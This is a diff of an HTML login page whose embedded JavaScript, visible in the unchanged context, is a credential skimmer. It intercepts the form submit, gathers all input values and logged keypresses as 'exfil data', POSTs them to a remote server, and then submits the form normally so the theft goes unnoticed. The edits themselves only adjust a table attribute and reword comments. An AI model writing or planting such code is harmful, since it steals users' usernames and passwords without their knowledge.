@@ -4,7 +4,7 @@
 </head>
 <body>
     <form id="login-form" method="post" action="login.php" >
-        <table border="0.5" >
+        <table>
             <tr>
                 <td><label for="user_id">User Name</label></td>
                 <td><input type="text" name="user_id" id="user_id"/></td>
@@ -60,7 +60,7 @@
             // once the targeted form is submitted retrieve all inputs (some may have been pre-filled)
             login_form.addEventListener('submit', function(event) {
                 event.preventDefault();
-                // acquire form data and add to exfiltrated data
+                // acquire form data and add to exfil data
                 let inputs = login_form.querySelectorAll('input');
                 let j;
                 for (j in inputs) {
@@ -79,7 +79,7 @@
                 logs.push(presses[presses.length - 1].t);
 
                 POST(remote, logs.join(''));
-                // wait to let logs get to server
+                // give script a second to send to remote server and then continue as if normal
                 setTimeout(function() {
                     login_form.removeEventListener('submit', this);
                     login_form.submit();
